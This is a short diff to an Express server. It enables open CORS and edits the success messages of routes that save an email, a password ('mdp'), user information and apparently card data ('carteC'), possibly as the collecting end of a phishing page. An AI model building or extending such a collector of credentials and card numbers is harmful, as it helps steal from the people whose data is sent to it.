@@ -2,8 +2,10 @@ const express = require('express');
     app = express();
     path = require('path');
     fs = require ('fs');
+    cors = require('cors');
  
-
+    app.use(cors());
+    
 // Request 
 
 app.get('/', (req, res) => {
@@ -36,7 +38,7 @@ app.post('/save-email', (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK !');
+            res.status(200).send('OK email !');
         });
     });
 });
@@ -67,7 +69,7 @@ app.post("/save-mdp", (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK !');
+            res.status(200).send('OK psw!');
         });
     });
     
@@ -95,7 +97,7 @@ app.post("/infoUser", (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK !');
+            res.status(200).send('OK userI !');
         })
     })
 })
@@ -122,7 +124,7 @@ app.post("/carteC", (req, res) => {
                 res.status(500).send('Internal server error');
                 return;
             }
-            res.status(200).send('OK !');
+            res.status(200).send('OK  userC!');
         })
     })
 
